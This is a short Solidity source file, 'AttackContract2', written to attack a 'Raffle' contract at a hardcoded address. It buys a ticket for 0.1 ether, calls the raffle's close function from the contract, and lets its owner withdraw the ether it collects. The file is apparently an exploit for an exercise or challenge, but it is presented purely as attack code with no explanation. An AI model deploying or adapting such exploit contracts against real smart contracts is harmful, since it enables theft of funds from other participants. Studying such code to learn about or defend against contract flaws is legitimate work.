pragma solidity 0.4.24;

import './Raffle.sol';

contract AttackContract2{
    address owner;
    Raffle raffle = Raffle(0xd47e4aceaeced42ea9043523a9014b8e38394a15);

    constructor() public {
        owner = msg.sender;
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function attack() public payable{
        require(msg.value == 0.1 ether);
        raffle.buyTicket.value(0.1 ether)();
    }
    function closeRaffle() public payable{
        raffle.closeRaffle();
    }

    function () public payable {}
}